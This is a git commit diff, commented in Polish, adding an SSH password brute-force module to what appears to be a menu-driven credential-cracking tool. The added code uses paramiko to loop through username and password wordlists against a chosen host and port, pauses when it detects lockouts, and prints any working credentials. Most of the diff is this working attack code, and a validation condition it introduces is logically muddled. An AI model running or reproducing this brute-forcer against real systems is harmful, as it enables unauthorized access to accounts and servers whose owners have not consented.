2c4ffaff28a27d7059cb22b7e9904f9a5d0b2fab
elmaccho <106253529+elmaccho@users.noreply.github.com>
2025-02-02 19:19:00 +0100

    atak ssh, ustalenie portu ssh

--- main.py
+++ main.py
@@ -1,3 +1,5 @@
+import paramiko
+import time
 from art import text2art
 from termcolor import colored
 
@@ -9,6 +11,8 @@ errorMessage = ""
 formMethod = ""
 usernames = ""
 username = ""
+
+ssh_port = 22
 
 def clearconsole():
     os.system("cls || clear")
@@ -110,12 +114,18 @@ def set_users_file():
     clearconsole()
     displaytext()
 
-    usernames = input("Wprowadz sciezke do pliku z nazwami uzytkownikow: ")
+    print("Aby anulowac wpisz " + colored("0", "red"))
+    set_usernames = input("Wprowadz sciezke do pliku z nazwami uzytkownikow: ")
 
-    if os.path.isfile(usernames):
+    if set_usernames == "0":
         errorMessage = ""
         select_attack()
-    elif usernames == "":
+
+    if os.path.isfile(set_usernames):
+        errorMessage = ""
+        usernames = set_usernames
+        select_attack()
+    elif set_usernames == "":
         errorMessage = "Wprowadz poprawne dane"
         set_users_file()
     else:
@@ -147,6 +157,114 @@ def choose_username():
         errorMessage = "Niepoprawna opcja!"
         choose_username()
 
+
+def start_ssh_bf():
+    global target, dictionary, username, usernames, errorMessage, ssh_port
+
+    clearconsole()
+    displaytext()
+
+    print(colored("Rozpoczynanie ataku na: ", "cyan") + target)
+    print(colored("Plik z haslami: ", "cyan") + dictionary)
+
+    if username:
+        print(colored("Uzytkownik: ", "cyan") + username)
+    if usernames:
+        print(colored("Uzytkownicy: ", "cyan") + usernames)
+
+    print(colored("Port: ", "cyan") + str(ssh_port))
+
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    if usernames:
+        with open(usernames, "r") as users:
+            for user in users:
+                user = user.strip()
+                with open(dictionary, "r") as passwords:
+                    for password in passwords:
+                        password = password.strip()
+                        try:
+                            print(colored("[*]", "yellow") + "Próbuje: " + user + ":" + password)
+                            client.connect(target, port=ssh_port, username=user, password=password, timeout=2)
+                            print(colored("[+]", "light_green") + "Znaleziono poprawne dane logowania: " + user + ":" + password)
+                            client.close()
+                            return
+                        except paramiko.AuthenticationException:
+                            pass
+                        except paramiko.SSHException:
+                            print(colored("[!]", "red") + "Możliwa blokada logowania. Czekam 10 sekund...")
+                            time.sleep(10)
+                        except Exception as e:
+                            print(colored("[!]", "red") + "Inny błąd: " + str(e))
+
+    if username:
+        with open(dictionary, "r") as passwords:
+            for password in passwords:
+                password = password.strip()
+                try:
+                    print(colored("[*]", "yellow") + "\tPróbuje: " + username + ":" + password)
+                    client.connect(target, port=ssh_port, username=username, password=password, timeout=1)
+                    print(colored("[+]", "light_green") + "\tZnaleziono poprawne dane logowania: " + colored(username, "light_green") + ":" + colored(password, "light_green"))
+                    client.close()
+                    return
+                except paramiko.AuthenticationException:
+                    pass
+                except paramiko.SSHException:
+                    print(colored("[!]", "red") + "\tMożliwa blokada logowania. Czekam 10 sekund...")
+                    time.sleep(10)
+                except Exception as e:
+                    print(colored("[!]", "red") + "\tInny błąd: " + str(e))
+
+    print(colored("[-]", "yellow") + "\tNie znaleziono poprawnych danych logowania.")
+
+
+def set_ssh_port():
+    global errorMessage, ssh_port
+
+    clearconsole()
+    displaytext()
+
+    print("Domyslny port "+ colored("SSH", "red")+" ustawiony jest na " + colored("22", "red"))
+    print("Czy chcesz go zmienic?")
+
+    print(colored("[1]", "yellow") + "\tNie")
+    print(colored("[2]", "yellow") + "\tTak")
+
+    change_port = int(input("Wybierz opcje: "))
+
+
+    if change_port == 1:
+        errorMessage = ""
+        start_ssh_bf()
+    elif change_port == 2:
+        errorMessage = ""
+        change_ssh_port()
+    else:
+        errorMessage = "Wybierz odpowiednia opcje"
+        set_ssh_port()
+
+def change_ssh_port():
+    global ssh_port, errorMessage
+    clearconsole()
+    displaytext()
+
+    while True:
+        try:
+            new_ssh_port = int(input("Wpisz nowy port dla SSH: "))
+            if 1 <= new_ssh_port <= 65535:
+                ssh_port = new_ssh_port
+                errorMessage = ""
+                start_ssh_bf()
+                break
+            else:
+                errorMessage = "Podaj port w zakresie 1-65535!"
+                change_ssh_port()
+        except ValueError:
+            errorMessage = "Podaj liczbę!"
+            change_ssh_port()
+
+
 def select_attack():
     global errorMessage
     global target
@@ -172,7 +290,7 @@ def select_attack():
         print(colored("---------------------------------------------------", "light_yellow"))
 
 
-    if target == "" or dictionary == "":
+    if target == "" or dictionary == "" or usernames == "" and target == "" or dictionary == "" or username == "":
         print(colored("[1]", "red") + "\tHTTP")
         print(colored("[2]", "red") + "\tSSH")
     else:
@@ -200,18 +318,19 @@ def select_attack():
     set_attack = int(input("Wybierz opcje: "))
 
     if set_attack == 1:
-        if target == "" or dictionary == "":
+        if target == "" or dictionary == "" or usernames == "" and target == "" or dictionary == "" or username == "":
             errorMessage = "Uzupelnij dane!"
             select_attack()
         else:
             errorMessage = ""
             set_form_method()
     elif set_attack == 2:
-        if target == "" or dictionary == "":
+        if target == "" or dictionary == "" or usernames == "" and target == "" or dictionary == "" or username == "":
             errorMessage = "Uzupelnij dane!"
             select_attack()
         else:
             errorMessage = ""
+            set_ssh_port()
     elif set_attack == 3:
         errorMessage = ""
         target_ip()
@@ -235,3 +354,4 @@ def start():
 
 if __name__ == '__main__':
     start()
+    # set_ssh_port()
